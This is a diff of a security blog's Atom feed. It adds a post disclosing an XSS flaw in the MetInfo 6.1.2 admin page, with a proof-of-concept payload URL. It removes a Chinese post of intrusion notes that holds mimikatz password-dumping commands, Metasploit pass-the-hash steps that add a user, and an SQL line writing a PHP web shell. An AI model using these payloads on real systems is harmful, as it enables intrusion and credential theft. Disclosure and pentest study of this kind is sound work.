@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://mang0.me/"/>
-  <updated>2018-10-15T00:40:51.589Z</updated>
+  <updated>2018-10-15T18:27:47.044Z</updated>
   <id>http://mang0.me/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Xss in MetInfo V6.1.2</title>
+    <link href="http://mang0.me/archives/a5c61176/"/>
+    <id>http://mang0.me/archives/a5c61176/</id>
+    <published>2018-10-15T18:16:08.000Z</published>
+    <updated>2018-10-15T18:27:47.044Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201810160210_976.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Xss-in-MetInfo-V6-1-2&quot;&gt;&lt;a href=&quot;#Xss-in-MetInfo-V6-1-2&quot; class=&quot;headerlink&quot; title=&quot;Xss in MetInfo V6.1.2&quot;&gt;&lt;/a&gt;Xss in MetInfo V6.1.2&lt;/
+      
+    
+    </summary>
+    
+      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+      <category term="cve" scheme="http://mang0.me/tags/cve/"/>
+    
+  </entry>
   
   <entry>
     <title>web漏洞挖掘之点击劫持漏洞</title>
@@ -494,31 +519,6 @@
     
     
       <category term="WP" scheme="http://mang0.me/tags/WP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>高级入侵</title>
-    <link href="http://mang0.me/archives/1f382107/"/>
-    <id>http://mang0.me/archives/1f382107/</id>
-    <published>2018-04-23T13:33:14.000Z</published>
-    <updated>2018-10-15T00:40:51.612Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="高级入侵"><a href="#高级入侵" class="headerlink" title="高级入侵"></a>高级入侵</h1><h3 id="Windows权限分析与密码安全测试"><a href="#Windows权限分析与密码安全测试" class="headerlink" title="Windows权限分析与密码安全测试"></a>Windows权限分析与密码安全测试</h3><p>1.windows xp写入管理员权限<br>2.windows 2003默认权限<br>—–默认只安装静态HTTP服务器<br>—–增强的文件访问控制<br>—–父目录被禁用<br>—–坚持最小特权原则</p><p>注意给users组只有读取和运行权限</p><p>直接在系统上面运行上面与webshell下运行木马区别<br>在系统上运行木马是系统权限运行，在webshell下运行木马是以当前内置中间件权限运行</p><p>中间件权限<br>1.菜刀进入右键<br>执行<br>whomai<br>得知自身权限<br>2.cd c:\www\<br>3.dir</p><h3 id="本地管理员密码如何直接提取"><a href="#本地管理员密码如何直接提取" class="headerlink" title="本地管理员密码如何直接提取"></a>本地管理员密码如何直接提取</h3><p>1.直接通过mimikatz读取管理员密码（win7 winxp）<br>第一条 ：privilege::debug  //提升权限<br>第二条：sekurlsa::logonpa ssWords //抓取密码</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091859_724.png" alt=""></p><p>2.webshell  </p><p>3.<a href="http://www.4hou.com/tools/7404.html" target="_blank" rel="external">Lazagne-master</a></p><p>4.利用hash远程登录系统主要通过msf的<br>exploit/windows/smb/psexec模块来完成<br><img src="http://oy0tigw51.bkt.clouddn.com/201801091927_696.png" alt=""></p><p>use exploit/windows/smb/psexec<br>show option<br>set RHOST 192.168.1.109<br>set SMBUser administrator<br>set SMPass   (根目录下的pass.txt里的哈希值)<br>exploit<br>shell<br>net user<br>net user 123 123 / add</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801091956_886.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801091957_230.png" alt=""></p><p>本地哈希破解<br>注意本地搜索sam 这个是目标机里的所有密码</p><p>5.通过LC5暴力破解hash密码<br>使用gmer直接提取sam和sysytem文件或用pwdump7提取HASH 最后使用LC5破解</p><p>6.使用Ophcrack（kali）破解系统hash密码</p><h3 id="获取Webshell方法总结"><a href="#获取Webshell方法总结" class="headerlink" title="获取Webshell方法总结"></a>获取Webshell方法总结</h3><h4 id="主要通过谷歌搜索cms漏洞"><a href="#主要通过谷歌搜索cms漏洞" class="headerlink" title="主要通过谷歌搜索cms漏洞"></a>主要通过谷歌搜索cms漏洞</h4><p>phpcms discuz phpwind</p><h4 id="非cms获取webshell方法"><a href="#非cms获取webshell方法" class="headerlink" title="非cms获取webshell方法"></a>非cms获取webshell方法</h4><p>1.数据库备份获取<br>2.抓包上传获取<br>3.sql命令获取<br>4.模板修改获取<br>5.插入一句话获取<br>6.修改上传类型获取</p><h4 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h4><p>PHPmyadmin获取</p><pre><code>select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]);echo \&#39;&lt;pre&gt;\&#39;;?&gt;&#39; into outfile &#39;E:/xamp/www/xioam.php&#39;</code></pre><p>php爆路径方法收集<br><img src="http://oy0tigw51.bkt.clouddn.com/201801092306_259.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092322_426.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092325_134.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201801092326_398.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201801092327_366.png" alt=""></p><p>tomcat获取<br>weblogic获取<br>jboss获取</p><h3 id="内网远程连接"><a href="#内网远程连接" class="headerlink" title="内网远程连接"></a>内网远程连接</h3><p>webshell如何开启3389</p><p>服务器端口被修改如何查找</p><p>cmd<br>tasklist /svc 寻找TermService</p><p>netstat -ano<br>查看所有端口</p><p>服务器处于内网如何连接</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;高级入侵&quot;&gt;&lt;a href=&quot;#高级入侵&quot; class=&quot;headerlink&quot; title=&quot;高级入侵&quot;&gt;&lt;/a&gt;高级入侵&lt;/h1&gt;&lt;h3 id=&quot;Windows权限分析与密码安全测试&quot;&gt;&lt;a href=&quot;#Windows权限分析与密码安全测试&quot; class=&quot;
-      
-    
-    </summary>
-    
-      <category term="渗透测试" scheme="http://mang0.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="入侵" scheme="http://mang0.me/tags/%E5%85%A5%E4%BE%B5/"/>
     
   </entry>
   
